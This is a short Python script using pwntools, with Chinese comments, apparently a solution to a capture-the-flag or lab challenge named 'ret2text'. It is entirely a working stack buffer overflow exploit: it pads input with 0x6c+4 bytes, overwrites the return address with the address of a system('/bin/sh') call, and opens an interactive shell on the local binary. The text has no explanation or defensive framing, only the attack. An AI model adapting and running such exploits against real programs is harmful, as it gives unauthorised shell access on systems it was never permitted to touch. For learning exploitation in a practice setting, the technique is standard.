#!/usr/bin/python3
from pwn import *

system_addr = 0x0804863a  # system("/bin/sh") 的地址
offset = 0x6c + 4  # 偏移量

sh = process("./ret2text")
sh.sendline(b'A' * offset + p32(system_addr))  # 构造 payload
sh.interactive()  # 交互模式